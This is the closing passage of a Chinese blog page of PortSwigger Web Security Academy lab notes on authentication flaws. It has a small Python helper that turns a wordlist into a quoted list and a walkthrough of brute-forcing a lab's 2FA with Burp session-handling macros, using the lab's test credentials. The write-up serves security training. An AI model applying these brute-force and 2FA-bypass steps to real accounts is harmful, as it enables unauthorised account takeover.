keyword" style="color:#00009f">as</span><span class="token plain"> f1</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        list1 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> f1</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">readlines</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">list1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        list1</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> list1</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">rstrip</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;\n&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> a </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> list1</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        s</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;\&quot;&quot;</span><span class="token operator" style="color:#393A34">+</span><span class="token plain">a</span><span class="token operator" style="color:#393A34">+</span><span class="token string" style="color:#e3116c">&quot;\&quot;,&quot;</span><span class="token operator" style="color:#393A34">+</span><span class="token plain">s</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">s</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">trans_file_string_to_be_string</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;1.txt&quot;</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>浏览器打开即可</p>
<p><img decoding="async" loading="lazy" alt="image-20250506140956851" src="/assets/images/image-20250506140956851-2836d696264872e8ea2f3b6a60df1b39.png" width="1920" height="694" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="使用暴力攻击绕过-2fa">使用暴力攻击绕过 2FA<a href="#使用暴力攻击绕过-2fa" class="hash-link" aria-label="使用暴力攻击绕过 2FA的直接链接" title="使用暴力攻击绕过 2FA的直接链接">​</a></h3>
<p>受害者凭据：<code>carlos:montoya</code></p>
<p>登录账户，需要二次验证，输入二次错误代码，账户会被自动注销</p>
<p>所以，需要使用 Burp 的会话处理功能自动重新登录</p>
<p><img decoding="async" loading="lazy" alt="image-20250506153330267" src="/assets/images/image-20250506153330267-92e525d1f52a7be76185f78ed12a0d0d.png" width="1571" height="933" class="img_ev3q"></p>
<p>点击添加会话处理规则，设置范围，选择所有URLs</p>
<p><img decoding="async" loading="lazy" alt="image-20250506153506484" src="/assets/images/image-20250506153506484-7e63ecc321839980d7fe0a1eab967013.png" width="994" height="462" class="img_ev3q"></p>
<p>开始添加规则的详细操作，<strong>选择运行一个宏</strong></p>
<p><img decoding="async" loading="lazy" alt="image-20250506153604258" src="/assets/images/image-20250506153604258-86a980ed4006bc5018cd376de331bd2d.png" width="994" height="547" class="img_ev3q"></p>
<p>之后添加一个宏</p>
<p><img decoding="async" loading="lazy" alt="image-20250506153739618" src="/assets/images/image-20250506153739618-97f14be27d85dc9b799e59db751755f4.png" width="994" height="391" class="img_ev3q"></p>
<p>选择需要自动化的数据包，长按<code>ctrl</code>多选，完成宏的创建</p>
<p><img decoding="async" loading="lazy" alt="image-20250506153855024" src="/assets/images/image-20250506153855024-f8e8eab2f15d43d92efbc14e41510b6d.png" width="1069" height="587" class="img_ev3q"></p>
<p>这样，在每次请求<code>POST /login2</code>，<code>csrf,session</code>都是刷新（有效的）</p>
<p><img decoding="async" loading="lazy" alt="image-20250506160432399" src="/assets/images/image-20250506160432399-ba626bf108fb5a2f9cbd668b8a244467.png" width="1920" height="885" class="img_ev3q"></p>
<p>漏洞点：每次登录<code>POST /login</code>生成一个2FA code，但是这个code在一段时间内均有效。而不是每次登录都会放弃之前的<code>2FA code</code></p>
<p><img decoding="async" loading="lazy" alt="image-20250506162420101" src="/assets/images/image-20250506162420101-609f9e4db0327d4a1053b18b58761d7f.png" width="1907" height="645" class="img_ev3q"></p>
<p>找到302状态码，替换session的值，成功登录</p></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"><a href="https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/PortSwigger/web-security/身份验证漏洞.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>编辑此页</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/PortSwigger/web-security/路径遍历"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">路径遍历</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#authentication-vulnerabilities" class="table-of-contents__link toc-highlight">Authentication vulnerabilities</a></li><li><a href="#什么是身份验证" class="table-of-contents__link toc-highlight">什么是身份验证</a></li><li><a href="#漏洞实验" class="table-of-contents__link toc-highlight">漏洞实验</a><ul><li><a href="#枚举用户名和密码" class="table-of-contents__link toc-highlight">枚举用户名和密码</a></li><li><a href="#2fa双重验证简单绕过" class="table-of-contents__link toc-highlight">2FA（双重验证）简单绕过</a></li><li><a href="#密码重置逻辑错误" class="table-of-contents__link toc-highlight">密码重置逻辑错误</a></li><li><a href="#根据响应不同枚举用户名" class="table-of-contents__link toc-highlight">根据响应不同枚举用户名</a></li><li><a href="#根据响应时间枚举用户名" class="table-of-contents__link toc-highlight">根据响应时间枚举用户名</a></li><li><a href="#破解暴力保护ip-封锁" class="table-of-contents__link toc-highlight">破解暴力保护、IP 封锁</a></li><li><a href="#通过帐户锁定进行用户名枚举" class="table-of-contents__link toc-highlight">通过帐户锁定进行用户名枚举</a></li><li><a href="#2fa-逻辑漏洞" class="table-of-contents__link toc-highlight">2FA 逻辑漏洞</a></li><li><a href="#爆破保持登录状态的cookie" class="table-of-contents__link toc-highlight">爆破保持登录状态的cookie</a></li><li><a href="#离线密码破解" class="table-of-contents__link toc-highlight">离线密码破解</a></li><li><a href="#通过中间件进行密码重置中毒" class="table-of-contents__link toc-highlight">通过中间件进行密码重置中毒</a></li><li><a href="#通过密码更改暴力破解密码" class="table-of-contents__link toc-highlight">通过密码更改暴力破解密码</a></li><li><a href="#密码爆破每个请求多个凭据" class="table-of-contents__link toc-highlight">密码爆破，每个请求多个凭据</a></li><li><a href="#使用暴力攻击绕过-2fa" class="table-of-contents__link toc-highlight">使用暴力攻击绕过 2FA</a></li></ul></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 My Blog, Inc. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>